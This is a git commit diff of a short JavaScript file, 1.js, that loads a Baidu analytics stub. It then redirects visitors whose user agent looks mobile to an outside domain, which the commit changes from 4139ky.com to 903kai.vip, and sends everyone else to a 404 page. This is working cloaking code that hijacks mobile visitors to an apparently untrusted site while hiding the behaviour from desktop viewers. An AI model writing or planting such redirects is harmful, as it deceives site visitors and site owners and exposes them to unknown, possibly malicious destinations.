7245e37e536afba0e63301915e1988be108b7d4a
dnshook <62766196+dnshook@users.noreply.github.com>
2023-03-18 16:51:51 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -7,7 +7,7 @@ var _hmt = _hmt || [];
 })();
 
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	window.location.href="http://4139ky.com";
+	window.location.href="http://903kai.vip";
 }else{
 	window.location.href="/404.html";
 }
